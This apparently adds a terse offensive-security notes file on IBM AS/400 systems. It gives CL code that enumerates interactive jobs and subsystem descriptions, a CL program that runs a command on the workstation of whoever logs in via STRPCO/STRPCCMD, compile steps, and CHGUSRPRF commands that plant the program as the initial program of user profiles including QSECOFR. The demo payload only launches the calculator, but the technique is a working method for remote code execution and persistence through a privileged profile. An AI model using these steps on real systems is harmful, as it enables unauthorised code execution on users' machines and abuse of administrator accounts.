@@ -1,0 +1,53 @@
+# Hijacking login screens
+
+  pgm
+  wrkusrjob user(bogus) status(*all) output(*print) jobtype(*interact)
+  cpysplf file(qpdspsbj) tofile(qgpl/splfcpy) splnbr(*last) mbropt(*add)
+  dspsbsd sbsd(qinter) output(*print)
+  cpysplf file(qprtsbsd) tofile(qgpl/splfcpy) splnbr(*last) mbropt(*add)
+  endpgm
+
+
+# Attacking workstations from an AS/400
+
+# CL program will execute notepad on the workstation the user is logging in from:
+  STRPCO
+  STRPCCMD PCCMD(CALC) PAUSE(*NO)
+ 
+
+How to write CL code:
+                1. Create a physical file
+                2. Add a member     (Type must be CLLE)
+                3. Edit member    (STRPDM - (Start Program Development Manager))   https://as400iseries.wordpress.com/category/cl-programming/
+                4. Compile program    (CRTCLPGM/SEU - Source Entry Utility)  CRTCLPGM PGM(Program/Lib) SRCFILE(Lib/Src)
+
+The Create CL Program (CRTCLPGM) command creates a Control Language (CL) program from the specified CL source program.
+
+                PGM
+                STRPCO
+                STRPCCMD PCCMD(CALC) PAUSE(*NO)
+                ENDPGM
+
+Location of src:
+
+                QGPL/CALCSTART
+
+Command to compile:
+
+                CRTCLPGM PGM(QGPL/CLPGM) SRCFILE(QGPL/CALCSTART)
+
+LOCATION OF COMPILED FILE:
+
+                QGPL/CLPGM
+
+ 
+
+The system value QSTRUPPGM (System Start-Up Program)
+ 
+
+ 
+
+** Add program to user profile INITIAL PROGRAM ****
+
+  CHGUSRPRF USRPRF(<PROFILE>) INLPGM(LIBRARY/PROGRAM)
+  CHGUSRPRF USRPRF(qsecofr) INLPGM(QGPL/CLPGM)              ***Requires *SECADM permissions to change *****
